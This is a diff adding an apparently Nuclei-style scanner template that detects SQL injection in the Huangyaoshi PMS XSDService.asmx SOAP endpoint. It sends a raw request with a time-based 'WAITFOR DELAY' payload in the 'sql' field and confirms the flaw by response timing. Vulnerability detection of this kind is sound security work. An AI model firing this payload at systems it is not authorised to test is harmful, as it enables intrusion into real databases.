@@ -1,0 +1,47 @@
+id: poc-yaml-huangyaoshi-pms-xsdservice-asmx-sqli
+info:
+  name: Huangyaoshi PMS XSDService.asmx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the Huangyaoshi PMS XSDService.asmx endpoint.
+
+variables:
+  t1: '{{rand_int(4,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /XSDService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetPdaTable"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetPdaTable xmlns="http://tempuri.org/">
+              <sql>;WAITFOR DELAY '0:0:{{t1}}'--</sql>
+            </GetPdaTable>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "id=\"NewDataSet\""
+          - "GetPdaTableResponse"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
